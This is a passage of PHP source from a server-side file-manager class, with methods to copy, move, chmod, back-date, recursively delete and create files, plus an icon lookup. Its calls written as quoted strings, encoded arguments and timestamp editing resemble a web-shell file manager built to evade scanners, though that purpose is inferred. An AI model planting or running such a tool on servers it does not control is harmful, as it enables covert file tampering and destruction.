                if (!empty($value)) {

                    if ($str) {
                        $status_ = self::__rcopy($file, $value . __DIRECTORY_SEPARATOR__ . $file);

                        if (!empty($status_['error'])) {
                            $status = 'failed';
                            if ($status_['file_error'] > 0) {
                                $detail = 'Failed to copy ' . $status_['file_error'] . ' file!';
                            } else {
                                $detail = 'Error:  ' . $status_['error'] . ' file!';
                            }
                        } else {
                            $status = 'success';
                            if ($status_['file_error'] > 0 || $status_['folder_error'] > 0) {
                                $detail = '<br>Success: ' . $status_['file'] . ' file and ' . $status_['folder'] . ' folder<br>
                                Failed: ' . $status_['file_error'] . ' file and ' . $status_['folder_error'] . ' folder';
                            } else {
                                $detail = 'Copied ' . $status_['file'] . ' file and ' . $status_['folder'] . ' folder success!';
                            }
                        }
                    } else {
                        if ("rename"($file, $value . __DIRECTORY_SEPARATOR__ . $file)) {
                            $status = 'success';
                            $detail = 'Move ' . (is_file($file) ? 'file' : 'folder') . ' success!';
                        } else {
                            $status = 'failed';
                            $detail = 'Failed to move ' . (is_file($file) ? 'file' : 'folder') . '!';
                        }
                    }
                } else {
                    $status = 'failed';
                    $detail = 'Can\'t ' . ($str ? 'copy' : 'move') . ' with empty destination';
                }
            } else {
                $status = 'failed';
                $detail = "File/Folder not exists!";
            }
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Recursive copy folder
     * @param string $path file/folder path
     * @param string $dest copy destination
     * @param bool $udp
     * @param bool $force
     */
    public static function __rcopy($path, $dest, $upd = true, $force = true)
    {
        $count = [
            'folder' => 0,
            'file' => 0,
            'error' => [],
            'folder_error' => 0,
            'file_error' => 0
        ];

        if (is_dir($path)) {
            if (!mkdir($dest, 0755, true)) {
                $count['error'][] = 'Error creating destination folder!';
                return $count;
            }
            $objects = scandir($path);
            if (is_array($objects)) {
                foreach ($objects as $file) {
                    if ($file != '.' && $file != '..') {
                        if (!self::__rcopy($path . __DIRECTORY_SEPARATOR__ . $file, $dest . __DIRECTORY_SEPARATOR__ . $file)) {
                            if (is_dir($path . __DIRECTORY_SEPARATOR__ . $file)) {
                                $count['folder_error']++;
                            } else {
                                $count['file_error']++;
                            }
                        } else {
                            if (is_dir($path . __DIRECTORY_SEPARATOR__ . $file)) {
                                $count['folder']++;
                            } else {
                                $count['file']++;
                            }
                        }
                    }
                }
            }
        } elseif (is_file($path)) {
            if (self::__copy($path, $dest, $upd)) {
                $count['file']++;
            } else {
                $count['file_error']++;
                $count['error'][] = 'Error copied file!';
            };
        }
        return $count;
    }

    /**
     * Copy file
     * @param string $f1 file/folder path
     * @param string $f2 copy destination
     * @param bool $udp
     */
    public static function __copy($f1, $f2, $upd)
    {
        $time1 = filemtime($f1);
        $desdir = dirname($f2);
        if (!file_exists($desdir)) {
            if (!mkdir($desdir, 0755, true)) {
                return false;
            }
        }

        if (file_exists($f2)) {
            $time2 = filemtime($f2);
            if ($time2 >= $time1 && $upd) {
                return false;
            }
        }
        $ok = copy($f1, $f2);
        if ($ok) {
            touch($f2, $time1);
        }
        return $ok;
    }

    /**
     * Chmod file/folder
     * @param string $file
     * @param string $value
     */
    public static function __chmod($file, $value, $opt = null)
    {
        if (str_contains($opt, 'bulksv')) {
            $files_c = 0;
            $folder_c = 0;
            $file_err = 0;
            $folder_err = 0;
            $array = json_decode(Utils::__charcode_dec($file), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $status = 'failed';
                $detail = "Error when decoding array!";
            } else {
                foreach ($array as $d1) {
                    $files = Utils::__string_dec($d1['file']);
                    $perms = 0;

                    for ($i = strlen($value) - 1; $i >= 0; --$i) {
                        $perms += (int)$value[$i] * pow(8, (strlen($value) - $i - 1));
                    }
                    if (@"chmod"($files, $perms)) {
                        if ($d1['item'] == 'dir') {
                            $folder_c++;
                        } else {
                            $files_c++;
                        }
                    } else {
                        if ($d1['item'] == 'dir') {
                            $folder_err++;
                        } else {
                            $file_err++;
                        }
                    }
                }

                $status = 'success';
                $detail = '<br>Success: ' . $files_c . ' file and ' . $folder_c . ' folder<br>
                Failed: ' . $file_err  . ' file and ' . $folder_err . ' folder';
            }
        } else {
            if ("file_exists"($file)) {
                if (!empty($value)) {
                    $perms = 0;

                    for ($i = strlen($value) - 1; $i >= 0; --$i) {
                        $perms += (int)$value[$i] * pow(8, (strlen($value) - $i - 1));
                    }
                    if (@"chmod"($file, $perms)) {
                        $status = 'success';
                        $detail = 'Change permission success!';
                    } else {
                        $status = 'failed';
                        $detail = 'Failed to change permission!';
                    }
                } else {
                    $status = 'failed';
                    $detail = 'Can\'t change permission with empty permission';
                }
            } else {
                $status = 'failed';
                $detail = "File/Folder not exists!";
            }
        }


        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Edit lastmodified of file/folder
     * @param string $file
     * @param string $value
     */
    public static function __time($file, $value, $opt = null)
    {
        if (str_contains($opt, 'bulksv')) {
            $files_c = 0;
            $folder_c = 0;
            $file_err = 0;
            $folder_err = 0;
            $array = json_decode(Utils::__charcode_dec($file), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $status = 'failed';
                $detail = "Error when decoding array!";
            } else {
                foreach ($array as $d1) {
                    $files = Utils::__string_dec($d1['file']);
                    $values = strtotime($value);
                    if (touch($files, $values)) {
                        if ($d1['item'] == 'dir') {
                            $folder_c++;
                        } else {
                            $files_c++;
                        }
                    } else {
                        if ($d1['item'] == 'dir') {
                            $folder_err++;
                        } else {
                            $file_err++;
                        }
                    }
                }

                $status = 'success';
                $detail = '<br>Success: ' . $files_c . ' file and ' . $folder_c . ' folder<br>
                Failed: ' . $file_err  . ' file and ' . $folder_err . ' folder';
            }
        } else {

            if ("file_exists"($file)) {
                if (!empty($value)) {
                    $value = strtotime($value);
                    if (touch($file, $value)) {
                        $status = 'success';
                        $detail = 'Change modification time success!';
                    } else {
                        $status = 'failed';
                        $detail = 'Failed to change modification time!';
                    }
                } else {
                    $status = 'failed';
                    $detail = 'Can\'t change modification time with empty time';
                }
            } else {
                $status = 'failed';
                $detail = "File/Folder not exists!";
            }
        }


        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Delete file/folder single/bulk
     * @param string $item
     * @return array [folder, file, status, folder_error, file_error]
     */
    public static function __rdelete($item)
    {
        $count = [
            'folder' => 0,
            'file' => 0,
            'status' => false,
            'folder_error' => 0,
            'file_error' => 0
        ];

        function delete_($item, &$count)
        {
            $structure = scandir($item);
            foreach ($structure as $file) {
                if ($file == '.' || $file == '..') continue;

                $fullPath = $item . __DIRECTORY_SEPARATOR__ . $file;

                if (is_dir($fullPath)) {
                    delete_($fullPath, $count);
                    if (!rmdir($fullPath)) {
                        $count['folder_error']++;
                    } else {
                        $count['folder']++;
                    }
                } elseif (is_file($fullPath)) {
                    if (!unlink($fullPath)) {
                        $count['file_error']++;
                    } else {
                        $count['file']++;
                    }
                }
            }
        }

        // Remove items in the given directory
        delete_($item, $count);

        // Only remove the main directory if there are no errors
        if ($count['file_error'] == 0 && $count['folder_error'] == 0) {
            if (rmdir($item)) {
                $count['folder']++;
                $count['status'] = true;
            }
        }

        return $count;
    }


    /**
     * Delete file/folder
     * @param string $file
     * @param string $value
     */
    public static function __delete($file, $value, $opt = null)
    {
        if (str_contains($opt, 'bulksv')) {
            $files_c = 0;
            $folder_c = 0;
            $file_err = 0;
            $folder_err = 0;
            $array = json_decode(Utils::__charcode_dec($file), true);
            if (json_last_error() !== JSON_ERROR_NONE) {
                $status = 'failed';
                $detail = "Error when decoding array!";
            } else {
                foreach ($array as $d1) {
                    $files = Utils::__string_dec($d1['file']);

                    if ($value == "DELETES") {
                        if (is_dir($files)) {
                            $delete = self::__rdelete($files);
                            if ($delete['status']) {
                                $folder_c += $delete['folder'];
                                $files_c += $delete['file'];
                            } else {
                                $folder_err += $delete['folder_error'];
                                $file_err += $delete['file_error'];
                            }
                        } else {
                            if ("unlink"($files)) {
                                if ($d1['item'] == 'dir') {
                                    $folder_c++;
                                } else {
                                    $files_c++;
                                }
                            } else {
                                if ($d1['item'] == 'dir') {
                                    $folder_err++;
                                } else {
                                    $file_err++;
                                }
                            }
                        }
                    }
                }

                $status = 'success';
                $detail = '<br>Success: ' . $files_c . ' file and ' . $folder_c . ' folder<br>
                Failed: ' . $file_err  . ' file and ' . $folder_err . ' folder';
            }
        } else {
            if ("file_exists"($file)) {
                $md5 = is_dir($file) ? md5($file) : md5_file($file);
                if ($value == $md5) {
                    if (is_dir($file)) {
                        $delete = self::__rdelete($file);
                        if ($delete['status']) {
                            $status = 'success';
                            $detail = 'Deleted ' . $delete['file'] . ' file and ' . $delete['folder'] . ' folder';
                        } else {
                            $status = 'failed';
                            $detail = 'Failed to delete ' . $delete['file_error'] . ' file and ' . $delete['folder_error'] . ' folder';
                        }
                    } else {
                        if ("unlink"($file)) {
                            $status = 'success';
                            $detail = 'File ' . $file . ' deleted!';
                        } else {
                            $status = 'failed';
                            $detail = 'Failed to delete file ' . $file . '!';
                        }
                    }
                } else {
                    $status = 'failed';
                    $detail = (is_dir($file) ? 'Folder' : 'Folder') . ' Signatures do not match';
                }
            } else {
                $status = 'failed';
                $detail = "File/Folder not found!";
            }
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Make file
     * @param string $filename
     * @param string $content
     */
    public static function __create_file($filename, $content)
    {
        $replace = false;
        if (str_contains($filename, 'R:') || str_contains($filename, 'replace:')) {
            $replace = true;
        }

        $filename = trim(preg_replace('/\b\w+:\s*/', '', $filename));

        if (!empty($filename)) {
            if (empty($content)) {
                $status = 'failed';
                $detail = 'Can\'t create file with empty value';
            } else {

                if ("file_exists"($filename)) {
                    if ($replace) {
                        if (Filesman::__save_file($filename, $content)) {
                            $status = 'success';
                            $detail = 'File replaced!';
                        } else {
                            $status = 'failed';
                            $detail = 'Replace file failed!';
                        }
                    } else {
                        $status = 'failed';
                        $detail = 'File exist, add <b>R:</b> or <b>replace:</b> before file name to replace the file';
                    }
                } else {
                    if (Filesman::__save_file($filename, $content)) {
                        $status = 'success';
                        $detail = 'File created!';
                    } else {
                        $status = 'failed';
                        $detail = 'Create file failed! ' . $filename;
                    }
                }
            }
        } else {
            $status = 'failed';
            $detail = 'Can\'t create file with empty name';
        }

        return json_encode(['status' => $status, 'detail' => $detail]);
    }

    /**
     * Get file icon
     * @param string $ext
     */
    public static function __icon($ext)
    {

        $icons = '';
        
        switch ($ext) {
            case 'ico':
            case 'gif':
            case 'jpg':
            case 'jpeg':
            case 'jpc':
            case 'jp2':
            case 'jpx':
            case 'xbm':
            case 'wbmp':
            case 'png':
            case 'bmp':
            case 'tif':
            case 'tiff':
            case 'webp':
            case 'avif':
            case 'svg':
            case 'psd':
            case 'ai':
            case 'eps':
            case 'fla':
            case 'swf':
                $icon = 'image';
                break;
            case 'wav':
            case 'mp3':
            case 'mp2':
            case 'm4a':
            case 'aac':
            case 'ogg':
            case 'oga':
            case 'wma':
            case 'mka':
            case 'flac':
            case 'ac3':
            case 'tds':
            case 'm3u':
            case 'm3u8':
            case 'pls':
            case 'cue':
            case 'xspf':
                $icon = 'audio';
                break;
            case 'avi':
            case 'mpg':
            case 'mpeg':
            case 'mp4':
            case 'm4v':
            case 'flv':
            case 'f4v':
            case 'ogm':
            case 'ogv':
            case 'mov':
            case 'mkv':
            case '3gp':
            case 'asf':
            case 'wmv':
            case 'webm':
                $icon = 'video';
                break;
            case 'xls':
            case 'xlsx':
            case 'csv':
                $icon = 'table';
                break;
            case 'txt':
            case 'ini':
            case 'log':
            case 'yml':
            case 'toml':
            case 'tmp':
            case 'top':
            case 'bot':
            case 'dat':
            case 'bak':
            case 'doc':
            case 'docx':
            case 'ppt':
            case 'pptx':
                $icon = 'document';
                break;
            case 'bz2':
            case 'tbz2';
            case 'tbz';
            case 'zip':
            case 'rar':
            case 'gz':
            case 'tgz';
            case 'tar':
            case '7z':
            case 'xz':
            case 'txz';
            case 'zst';
            case 'tzst';
                $icon = 'zip';
                break;
            case 'php':
            case 'php2':
            case 'php3':
            case 'php4':
            case 'php5':
            case 'php6':
            case 'php7':
            case 'phps':
            case 'pht':
            case 'phtm':
            case 'phtml':
            case 'pgif':
            case 'phar':
            case 'inc':
            case 'hphp':
            case 'ctp':
            case 'module':
                $icon = 'php';
                break;
            case 'htm':
            case 'html':
            case 'shtml':
            case 'xhtml':
                $icon = 'html';
                break;
            case 'css':
            case 'less':
            case 'sass':
            case 'scss':
                $icon = 'css';
                break;
            case 'js':
                $icon = 'javascript';
                break;
            case 'ts':
            case 'tsx':
                $icon = 'typescript';
                break;
            case 'pdf':
                $icon = 'pdf';
                break;
            case 'inf':
            case 'cmd':
            case 'bat':
            case 'ps1':
                $icon = 'powershell';
                break;
            case 'yaml':
                $icon = 'yaml';
                break;
            case 'json':
                $icon = 'json';
                break;
            case 'sql':
                $icon = 'database';
                break;
            case 'md':
                $icon = 'markdown';
                break;
            case 'xml':
                $icon = 'xml';
                break;
            case 'lock':
                $icon = 'lock';
                break;
            case 'py':
            case 'pyi':
            case 'pyc':
            case 'pyd':
            case 'pyo':
            case 'pyw':
            case 'pyz':
                $icon = 'python';
                break;
            case 'pl':
            case 'cgi':
                $icon = 'perl';
                break;
            case 'rb':
                $icon = 'ruby';
                break;
            case 'swift':
                $icon = 'swift';
                break;
            case 'kt':
            case 'kts':
                $icon = 'kotlin';
                break;
            case 'java':
            case 'class':
                $icon = 'java';
                break;
            case 'cpp':
            case 'cxx':
            case 'cc':
            case 'gcc':
            case 'c':
                $icon = 'cpp';
                break;
            case 'cs':
                $icon = 'csharp';
                break;
            case 'exe':
            case 'msi':
                $icon = 'exe';
                break;
            case 'apk':
            case 'obb':
                $icon = 'android';
                break;
            case 'dll':
                $icon = 'lib';
                break;
            case 'conf':
            case 'htaccess':
            case 'htpasswd':
                $icon = 'settings';
                break;
            case 'folder':
                $icon = 'folder-admin';
                break;
            default:
                $icon = 'template';
        }

        switch ($icon) {
            case 'android':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjQiIGhlaWdodD0iMTAiIHg9IjIiIHk9IjEyIiBmaWxsPSIjOGJjMzRhIiByeD0iMiIvPjxyZWN0IHdpZHRoPSI0IiBoZWlnaHQ9IjEwIiB4PSIyNiIgeT0iMTIiIGZpbGw9IiM4YmMzNGEiIHJ4PSIyIi8+PHBhdGggZmlsbD0iIzhiYzM0YSIgZD0iTTggMTJoMTZ2MTJIOHptMiAxMmg0djRhMiAyIDAgMCAxLTIgMiAyIDIgMCAwIDEtMi0ydi00Wm04IDBoNHY0YTIgMiAwIDAgMS0yIDIgMiAyIDAgMCAxLTItMnYtNFptMy41NDUtMTkuNzU5IDIuMTItMi4xMkExIDEgMCAwIDAgMjIuMjUxLjcwN2wtMi4zMjYgMi4zMjZhNy45NyA3Ljk3IDAgMCAwLTcuODUgMEw5Ljc1LjcwN2ExIDEgMCAxIDAtMS40MTQgMS40MTRsMi4xMiAyLjEyQTcuOTcgNy45NyAwIDAgMCA4IDEwaDE2YTcuOTcgNy45NyAwIDAgMC0yLjQ1NS01Ljc1OVpNMTQgOGgtMlY2aDJabTYgMGgtMlY2aDJaIi8+PC9zdmc+';
                break;

            case 'audio':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2VmNTM1MCIgZD0iTTE2IDJhMTQgMTQgMCAxIDAgMTQgMTRBMTQgMTQgMCAwIDAgMTYgMlptNiAxMGgtNHY4YTQgNCAwIDEgMS00LTQgMy45NTkgMy45NTkgMCAwIDEgMiAuNTU1VjhoNloiLz48L3N2Zz4=';
                break;

            case 'swift':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ZlNWUyZiIgZD0iTTE3LjA4NyAxOS43MjFjLTIuMzYgMS4zNi01LjU5IDEuNS04Ljg2LjFhMTMuODA3IDEzLjgwNyAwIDAgMS02LjIzLTUuMzJjLjY3LjU1IDEuNDYgMSAyLjMgMS40IDMuMzcgMS41NyA2LjczIDEuNDYgOS4xIDAtMy4zNy0yLjU5LTYuMjQtNS45Ni04LjM3LTguNzEtLjQ1LS40NS0uNzgtMS4wMS0xLjEyLTEuNTEgOC4yOCA2LjA1IDcuOTIgNy41OSAyLjQxLTEuMDEgNC44OSA0Ljk0IDkuNDMgNy43NCA5LjQzIDcuNzQuMTYuMDkuMjUuMTYuMzYuMjIuMS0uMjUuMTktLjUxLjI2LS43OC43OS0yLjg1LS4xMS02LjEyLTIuMDgtOC44MSA0LjU1IDIuNzUgNy4yNSA3LjkxIDYuMTIgMTIuMjQtLjAzLjExLS4wNi4yMi0uMDUuMzkgMi4yNCAyLjgzIDEuNjQgNS43OCAxLjM1IDUuMjItMS4yMS0yLjM5LTMuNDgtMS42NS00LjYyLTEuMTd6Ii8+PC9zdmc+';
                break;

            case 'kotlin':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PGRlZnM+PGxpbmVhckdyYWRpZW50IGlkPSJhIiB4MT0iMS43MjUiIHgyPSIyMi4xODUiIHkxPSIyMi42NyIgeTI9IjEuOTgyIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDEuMzA2IDEuMTI5KSBzY2FsZSguODkzMjQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjMDI5NmQ4Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjODM3MWQ5Ii8+PC9saW5lYXJHcmFkaWVudD48bGluZWFyR3JhZGllbnQgaWQ9ImIiIHgxPSIxLjg2OSIgeDI9IjIyLjc5OCIgeTE9IjIyLjM4MiIgeTI9IjMuMzc3IiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDEuMzIzIDEuMTI5KSBzY2FsZSguODkzMjQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjY2I1NWMwIi8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjZjI4ZTBlIi8+PC9saW5lYXJHcmFkaWVudD48L2RlZnM+PHBhdGggZmlsbD0idXJsKCNhKSIgZD0iTTIuOTc1IDIuOTc2djE4LjA0OGgxOC4wNXYtLjAzbC00LjQ3OC00LjUxMS00LjQ4LTQuNTE1IDQuNDgtNC41MTUgNC40NDMtNC40Nzd6Ii8+PHBhdGggZmlsbD0idXJsKCNiKSIgZD0ibTEyLjIyMyAyLjk3Ni05LjIzIDkuMjN2OC44MThoLjA4M2w5LjAzMi05LjAzMi0uMDI0LS4wMjQgNC40OC00LjUxNSA0LjQ0My00LjQ3N2gtOC43ODR6Ii8+PC9zdmc+';
                break;

            case 'csharp':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzAyODhkMSIgZD0iTTI4IDE0di00aC0ydjRoLTZ2LTRoLTJ2NGgtNHYyaDR2NGgydi00aDZ2NGgydi00aDR2LTJoLTR6Ii8+PHBhdGggZmlsbD0iIzAyODhkMSIgZD0iTTEzLjU2MyAyMkE1LjU3IDUuNTcgMCAwIDEgOCAxNi40Mzd2LTIuODczQTUuNTcgNS41NyAwIDAgMSAxMy41NjMgOEgxOFYyaC00LjQzN0ExMS41NjMgMTEuNTYzIDAgMCAwIDIgMTMuNTYzdjIuODczQTExLjU2NCAxMS41NjQgMCAwIDAgMTMuNTYzIDI4SDE4di02WiIvPjwvc3ZnPg==';
                break;

            case 'cpp':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzAyODhkMSIgZD0iTTMwIDE0di0yaC0yVjhoLTJ2NGgtMlY4aC0ydjRoLTJ2MmgydjJoLTJ2MmgydjRoMnYtNGgydjRoMnYtNGgydi0yaC0ydi0yWm0tNCAyaC0ydi0yaDJabS0xMi40MzcgNkE1LjU3IDUuNTcgMCAwIDEgOCAxNi40Mzd2LTIuODczQTUuNTcgNS41NyAwIDAgMSAxMy41NjMgOEgxOFYyaC00LjQzN0ExMS41NjMgMTEuNTYzIDAgMCAwIDIgMTMuNTYzdjIuODczQTExLjU2NCAxMS41NjQgMCAwIDAgMTMuNTYzIDI4SDE4di02WiIvPjwvc3ZnPg==';
                break;

            case 'java':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2Y0NDMzNiIgZD0iTTQgMjZoMjR2Mkg0ek0yOCA0SDdhMSAxIDAgMCAwLTEgMXYxM2E0IDQgMCAwIDAgNCA0aDEwYTQgNCAwIDAgMCA0LTR2LTRoNGEyIDIgMCAwIDAgMi0yVjZhMiAyIDAgMCAwLTItMlptMCA4aC00VjZoNFoiLz48L3N2Zz4=';
                break;

            case 'css':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzQyYTVmNSIgZD0ibTI5LjE4IDQtMy41NyAxOC4zNi0uMzMgMS42NC00Ljc0IDEuNTctMy4yOCAxLjA5TDEzLjIxIDI4IDIuODcgMjQuMDUgNC4wNSAxOGg0LjJsLS40NCAyLjg1IDYuMzQgMi40Mi43OC0uMjYgNi41Mi0yLjE2LjE3LS44My43OS00LjAySDQuNDRsLjc0LTMuNzYuMDUtLjI0aDE3Ljk2bC43OC00SDZsLjc4LTRoMjIuNHoiLz48L3N2Zz4=';
                break;

            case 'database':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2ZmY2EyOCIgZD0iTTE2IDI0Yy01LjUyNSAwLTEwLS45LTEwLTJ2NGMwIDEuMSA0LjQ3NSAyIDEwIDJzMTAtLjkgMTAtMnYtNGMwIDEuMS00LjQ3NSAyLTEwIDJabTAtOGMtNS41MjUgMC0xMC0uOS0xMC0ydjRjMCAxLjEgNC40NzUgMiAxMCAyczEwLS45IDEwLTJ2LTRjMCAxLjEtNC40NzUgMi0xMCAyWm0wLTEyQzEwLjQ3NyA0IDYgNC44OTUgNiA2djRjMCAxLjEgNC40NzUgMiAxMCAyczEwLS45IDEwLTJWNmMwLTEuMTA1LTQuNDc3LTItMTAtMloiLz48L3N2Zz4=';
                break;

            case 'document':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTAgMGgyNHYyNEgwVjB6Ii8+PHBhdGggZmlsbD0iIzQyYTVmNSIgZD0iTTggMTZoOHYySDh6bTAtNGg4djJIOHptNi0xMEg2Yy0xLjEgMC0yIC45LTIgMnYxNmMwIDEuMS44OSAyIDEuOTkgMkgxOGMxLjEgMCAyLS45IDItMlY4bC02LTZ6bTQgMThINlY0aDd2NWg1djExeiIvPjwvc3ZnPg==';
                break;

            case 'exe':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2U2NGExOSIgZD0iTTI4IDRINGEyIDIgMCAwIDAtMiAydjIwYTIgMiAwIDAgMCAyIDJoMjRhMiAyIDAgMCAwIDItMlY2YTIgMiAwIDAgMC0yLTJabTAgMjJINFYxMGgyNFoiLz48L3N2Zz4=';
                break;

            case 'folder-admin':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iIzU0NmU3YSIgZD0ibTEzLjg0NCA3LjUzNi0xLjI4OC0xLjA3MkEyIDIgMCAwIDAgMTEuMjc2IDZINGEyIDIgMCAwIDAtMiAydjE2YTIgMiAwIDAgMCAyIDJoMjRhMiAyIDAgMCAwIDItMlYxMGEyIDIgMCAwIDAtMi0ySDE1LjEyNGEyIDIgMCAwIDEtMS4yOC0uNDY0WiIvPjxwYXRoIGZpbGw9IiNjZmQ4ZGMiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZD0ibTI1IDEwLTcgMy4yNzN2NC45MDhjMCA0LjU0MiAyLjk4NiA4Ljc4OCA3IDkuODE5IDQuMDE0LTEuMDMxIDctNS4yNzcgNy05Ljgydi00LjkwN0wyNSAxMG0wIDMuMjczYTIuNDU3IDIuNDU3IDAgMSAxLTIuMzMzIDIuNDU0QTIuMzk2IDIuMzk2IDAgMCAxIDI1IDEzLjI3M20zLjk5IDkuODE3QTcuNTk1IDcuNTk1IDAgMCAxIDI1IDI2LjI5OGE3LjU5NyA3LjU5NyAwIDAgMS0zLjk5LTMuMjA4IDguNDQzIDguNDQzIDAgMCAxLS42NzctMS4yNWMwLTEuMzUyIDIuMTA4LTIuNDU2IDQuNjY3LTIuNDU2czQuNjY2IDEuMDggNC42NjYgMi40NTVhOC4zMTUgOC4zMTUgMCAwIDEtLjY3NiAxLjI1MVoiLz48L3N2Zz4=';
                break;

            case 'html':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHBhdGggZmlsbD0iI2U0NGQyNiIgZD0ibTQgNCAyIDIyIDEwIDIgMTAtMiAyLTIyWm0xOS43MiA3SDExLjI4bC4yOSAzaDExLjg2bC0uODAyIDkuMzM1TDE1Ljk5IDI1bC02LjYzNS0xLjY0Nkw4LjkzIDE5aDMuMDJsLjE5IDIgMy44Ni43NyAzLjg0LS43Ny4yOS00SDguODRMOCA4aDE2WiIvPjwvc3ZnPg==';
                break;

            case 'image':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzI2YTY5ZiIgZD0iTTEzIDloNS41TDEzIDMuNVY5TTYgMmg4bDYgNnYxMmEyIDIgMCAwIDEtMiAySDZhMiAyIDAgMCAxLTItMlY0YzAtMS4xMS44OS0yIDItMm0wIDE4aDEydi04bC00IDQtMi0yLTYgNk04IDlhMiAyIDAgMCAwLTIgMiAyIDIgMCAwIDAgMiAyIDIgMiAwIDAgMCAyLTIgMiAyIDAgMCAwLTItMnoiLz48L3N2Zz4=';
                break;

            case 'javascript':
                $icons = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHBhdGggZmlsbD0iI2ZmY2EyOCIgZD0iTTIgMmgxMnYxMkgyVjJtMy4xNTMgMTAuMDI3Yy4yNjcuNTY3Ljc5NCAxLjAzMyAxLjY5NCAxLjAzMyAxIDAgMS42ODYtLjUzMyAxLjY4Ni0xLjdWNy41MDdINy40djMuODI3YzAgLjU3My0uMjMzLjcyLS42LjcyLS4zODcgMC0uNTQ3LS4yNjctLjcyNy0uNThsLS45Mi41NTNtMy45ODctLjEyYy4zMzMuNjUzIDEuMDA3IDEuMTUzIDIuMDYgMS4xNTMgMS4wNjcgMCAxLjg2Ny0uNTUzIDEuODY3LTEuNTczIDAtLjk0LS41NC0xLjM2LTEuNS0xLjc3M2wtLjI4LS4xMmMtLjQ4Ny0uMjA3LS42OTQtLjM0Ny0uNjk0LS42OCAwLS4yNzQuMjA3LS40ODcuNTQtLjQ4Ny4zMiAwIC41MzQuMTQuNzI3LjQ4N2wuODczLS41OGMtLjM2Ni0uNjQtLjg4Ni0uODg3LTEuNi0uODg3LTEuMDA2IDAtMS42NTMuNjQtMS42NTMgMS40ODcgMCAuOTIuNTQgMS4zNTMgMS4zNTMgMS43bC4yOC4xMmMuNTIuMjI2LjgyNy4zNjYuODI3Ljc1MyAwIC4zMi0uMy41NTMtLjc2Ny41NTMtLjU1MyAwLS44NzMtLjI4Ni0xLjExMy0uNjg2eiIvPjwvc3ZnPg==';
                break;

            case 'typescript':
